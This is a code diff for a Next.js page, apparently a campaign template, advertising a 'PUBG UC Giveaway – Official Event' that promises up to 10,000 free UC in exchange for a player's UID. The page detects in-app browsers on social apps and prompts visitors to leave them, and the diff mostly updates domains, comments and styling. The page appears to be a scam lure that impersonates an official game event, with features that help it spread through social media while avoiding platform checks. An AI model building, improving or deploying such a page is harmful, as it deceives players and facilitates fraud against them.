@@ -4,19 +4,17 @@ import { useRouter } from 'next/router';
 import { withCampaignMeta } from '../../lib/withCampaignMeta';
 import { fetchCampaign } from '../../lib/fetchCampaign';
 
-// ── Default Meta ──
 const defaultMeta = {
   title: 'PUBG UC Giveaway – Official Event',
   description: 'Claim free UC for PUBG Mobile. Complete tasks and win up to 10,000 UC. Limited time official event.',
-  image: 'https://maketrend.vercel.app/og-pubg-uc.jpg', // replace
-  url: 'https://maketrend.vercel.app/pubg-uc-giveaway-v1?id={id}',
+  image: 'https://maketrend.app/og-image.png',
+  url: 'https://maketrend.app/pubg-uc-giveaway-v1?id={id}',
 };
 
 function PubgUcGiveawayV1({ campaign }) {
   const router = useRouter();
   const { id } = router.query;
 
-  // ── State ──
   const [uid, setUid] = useState('');
   const [server, setServer] = useState('asia');
   const [acceptedTerms, setAcceptedTerms] = useState(false);
@@ -24,7 +22,6 @@ function PubgUcGiveawayV1({ campaign }) {
   const [error, setError] = useState('');
   const [showWebViewModal, setShowWebViewModal] = useState(false);
 
-  // ── WebView detection ──
   useEffect(() => {
     const ua = navigator.userAgent.toLowerCase();
     const isWebView = /facebook|instagram|twitter|tiktok|line|whatsapp|snapchat|pinterest|fbav|fban/.test(ua) ||
@@ -34,10 +31,8 @@ function PubgUcGiveawayV1({ campaign }) {
     if (isWebView) setShowWebViewModal(true);
   }, []);
 
-  // ── Validate UID (8-12 digits) ──
   const isValidUid = (val) => /^\d{8,12}$/.test(val);
 
-  // ── Submit and redirect ──
   const handleSubmit = () => {
     if (!isValidUid(uid)) {
       setError('Enter a valid 8‑12 digit UID.');
@@ -49,7 +44,6 @@ function PubgUcGiveawayV1({ campaign }) {
     }
     setError('');
     setLoading(true);
-
     if (!id) {
       router.push('/create');
     } else {
@@ -57,7 +51,6 @@ function PubgUcGiveawayV1({ campaign }) {
     }
   };
 
-  // ── WebView Modal ──
   if (showWebViewModal) {
     return (
       <div className="modal-overlay">
@@ -75,10 +68,8 @@ function PubgUcGiveawayV1({ campaign }) {
     );
   }
 
-  // ── Main UI ──
   return (
     <div className="page-wrapper">
-
       {/* ─── HEADER ─── */}
       <header className="site-header">
         <div className="header-container">
@@ -98,7 +89,7 @@ function PubgUcGiveawayV1({ campaign }) {
         </div>
       </header>
 
-      {/* ─── HERO SECTION ─── */}
+      {/* ─── HERO ─── */}
       <section className="hero-section">
         <div className="hero-overlay"></div>
         <div className="hero-content">
@@ -116,7 +107,7 @@ function PubgUcGiveawayV1({ campaign }) {
         </div>
       </section>
 
-      {/* ─── REWARDS SHOWCASE ─── */}
+      {/* ─── REWARDS ─── */}
       <section className="rewards-section">
         <h2 className="section-title">🎁 What You Can Win</h2>
         <div className="rewards-grid">
@@ -270,18 +261,22 @@ function PubgUcGiveawayV1({ campaign }) {
         </div>
       </footer>
 
-      {/* ─── ALL STYLES ─── */}
+      {/* ─── FULL CSS (now with !important fallback for safety) ─── */}
       <style dangerouslySetInnerHTML={{ __html: `
         /* ───── RESET ───── */
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-          font-family: 'Segoe UI', 'Helvetica Neue', system-ui, sans-serif;
-          background: #0b0d10;
-          color: #f0f0f0;
+          font-family: 'Segoe UI', system-ui, sans-serif;
+          background: #0b0d10 !important;
+          color: #f0f0f0 !important;
           line-height: 1.6;
           scroll-behavior: smooth;
         }
-        .page-wrapper { max-width: 100%; overflow-x: hidden; }
+        .page-wrapper {
+          max-width: 100%;
+          overflow-x: hidden;
+          background: #0b0d10;
+        }
 
         /* ───── HEADER ───── */
         .site-header {
@@ -430,6 +425,7 @@ function PubgUcGiveawayV1({ campaign }) {
           text-align:center;
           margin-bottom:2.5rem;
           position:relative;
+          color:#fff;
         }
         .section-title::after {
           content:'';
@@ -461,7 +457,7 @@ function PubgUcGiveawayV1({ campaign }) {
           border-color:#ff8c00;
         }
         .reward-icon { font-size:3rem; margin-bottom:0.5rem; }
-        .reward-card h3 { font-size:1.4rem; font-weight:800; }
+        .reward-card h3 { font-size:1.4rem; font-weight:800; color:#fff; }
         .reward-card p { color:#aaa; font-size:0.9rem; }
 
         /* ───── HOW IT WORKS ───── */
@@ -496,6 +492,7 @@ function PubgUcGiveawayV1({ campaign }) {
         .step-content h3 {
           font-size:1.2rem;
           font-weight:700;
+          color:#fff;
           margin-bottom:0.2rem;
         }
         .step-content p {
@@ -545,6 +542,7 @@ function PubgUcGiveawayV1({ campaign }) {
           font-size:2rem;
           font-weight:800;
           text-align:center;
+          color:#fff;
           margin-bottom:0.2rem;
         }
         .claim-card > p {
@@ -557,6 +555,7 @@ function PubgUcGiveawayV1({ campaign }) {
           display:block;
           font-weight:600;
           font-size:0.9rem;
+          color:#ddd;
           margin-bottom:0.3rem;
         }
         .form-group .required { color:#ff4444; }
@@ -695,6 +694,7 @@ function PubgUcGiveawayV1({ campaign }) {
         .modal-card h2 {
           font-size:1.6rem;
           font-weight:800;
+          color:#fff;
           margin-bottom:0.5rem;
         }
         .modal-card p {
@@ -759,12 +759,10 @@ function PubgUcGiveawayV1({ campaign }) {
   );
 }
 
-// ── Server‑side props ──
 export async function getServerSideProps({ query }) {
   const campaignId = query.id || query.campaign || null;
   const campaign = campaignId ? await fetchCampaign(campaignId) : null;
   return { props: { campaign } };
 }
 
-// ── Wrap with Meta HOC ──
 export default withCampaignMeta(PubgUcGiveawayV1, defaultMeta);
